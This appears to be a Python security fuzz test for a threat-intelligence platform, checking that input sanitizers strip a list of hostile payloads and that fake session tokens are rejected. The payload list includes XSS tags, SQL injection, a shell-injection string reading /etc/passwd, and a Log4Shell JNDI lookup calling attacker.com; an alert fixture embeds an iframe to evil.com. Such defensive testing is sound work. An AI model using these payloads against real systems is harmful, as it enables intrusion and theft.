"""
BOB Defense Threat Intelligence Platform
Automated Security & Vulnerability Fuzz Test
"""

import unittest
import json
from backend.supabase_client import supabase_auth
from backend.security import sanitize_input_string, sanitize_alert_payload

class SecurityFuzzTest(unittest.TestCase):
    def setUp(self):
        reg_data = {
            "name": "Security Fuzz Tester",
            "callsign": "FUZZ-SEC-01",
            "email": "fuzz.tester@bob-defense.mil",
            "clearance_level": "LEVEL-5 (TOP SECRET // SI-TK)",
            "division": "Security Assessment Unit",
            "password": "FuzzPassword2026!"
        }
        ok, msg, res = supabase_auth.register_analyst(reg_data)
        if not ok:
            _, _, res = supabase_auth.login_analyst(reg_data["email"], reg_data["password"])
        self.token = res["token"]

    def test_exploit_payloads_sanitization(self):
        payloads = [
            "<script>alert('xss')</script>",
            "\" onerror=\"alert(1)\"",
            "' OR '1'='1' --",
            "; cat /etc/passwd; id;",
            "A" * 3000,
            "${jndi:ldap://attacker.com/exploit}",
            "{{7*7}}",
            "\x00\x01\x02\x03"
        ]

        for p in payloads:
            sanitized = sanitize_input_string(p)
            self.assertNotIn("<script>", sanitized)
            self.assertNotIn("alert('xss')", sanitized)
            self.assertNotIn("\x00", sanitized)

    def test_alert_payload_sanitization(self):
        raw_payload = {
            "source_type": "CYBER",
            "source_feed": "<script>alert('feed')</script>",
            "title": "SQLi Injection ' OR '1'='1' Attempt",
            "description": "Exploit payload <iframe src='evil.com'></iframe> executed",
            "target_asset": "DEF-TEST-ASSET",
            "confidence_score": 0.85
        }
        cleaned = sanitize_alert_payload(raw_payload)
        self.assertNotIn("<script>", cleaned["source_feed"])
        self.assertNotIn("<iframe", cleaned["description"])

    def test_auth_token_verification(self):
        analyst = supabase_auth.validate_session(self.token)
        self.assertIsNotNone(analyst)
        self.assertEqual(analyst["callsign"], "FUZZ-SEC-01")

        # Fake token
        invalid = supabase_auth.validate_session("fake-expired-token-12345")
        self.assertIsNone(invalid)

if __name__ == "__main__":
    unittest.main()
